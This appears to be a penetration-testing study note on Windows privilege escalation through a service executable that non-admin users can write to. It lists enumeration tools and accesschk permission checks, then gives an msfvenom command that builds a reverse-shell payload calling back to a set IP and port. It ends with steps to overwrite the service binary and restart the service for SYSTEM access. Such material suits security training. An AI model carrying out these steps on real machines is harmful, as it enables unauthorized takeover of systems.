# Escalation via Insecure Service Executable

If a service’s **executable file** (`.exe`) is **writable by non-admin users**, it becomes a privilege escalation risk.

You can **replace the original executable with a malicious one**, and when the service is restarted, it will run **your payload** — potentially with **SYSTEM privileges**.

### 🧰 Enumeration Tools

- **PowerUp.ps1** (PowerShell script)
- **WinPEAS.exe** (automated enumeration tool)

After running one of these, look for Files highlighted as **world-writable** (accessible by Everyone or your user)

<img width="900" height="45" alt="image" src="https://github.com/user-attachments/assets/feb952d2-3ad3-4a63-ac47-094ab57c9065" />


*(Example: Found executable* `C:\Program Files\Files Permissions Service\filepermservice.exe` **

### 🔐 Step 1: Check File Permissions

Use `accesschk` to see if the executable is writable:

```bash
accesschk.exe /accepteula -quvw "C:\Program Files\Files Permissions Service\filepermservice.exe"
```

Look for `W` write access granted to:

- `Users`
- `Everyone`
- Your own user

<img width="794" height="254" alt="image" src="https://github.com/user-attachments/assets/9069aca8-b8c7-4684-a1cc-50a262bd9f66" />


### 🔧 Step 2: Can You Start/Stop the Service?

Check if you can control the service:

```bash
accesschk.exe /accepteula -ucqv filepermsvc
```

Make sure you have:

- `SERVICE_START`
- `SERVICE_STOP`

### 💣 Step 3: Create a Malicious Executable

Generate a reverse shell payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.132 LPORT=4444 -f exe -o reverse.exe
```

### 📤 Step 4: Replace the Service Executable

Copy `reverse.exe` to the victim machine and overwrite the vulnerable service executable:

Replace:

`filepermservice.exe`

With:

`reverse.exe` with original name `filepermservice.exe`

Make sure the name and path match exactly. 

*(Backup original executable first if needed)*

### 🚀 Step 5: Restart the Service

```bash
net stop filepermsvc
net start filepermsvc
```

Once restarted, it will run **your reverse shell payload**, giving you elevated access (usually SYSTEM).
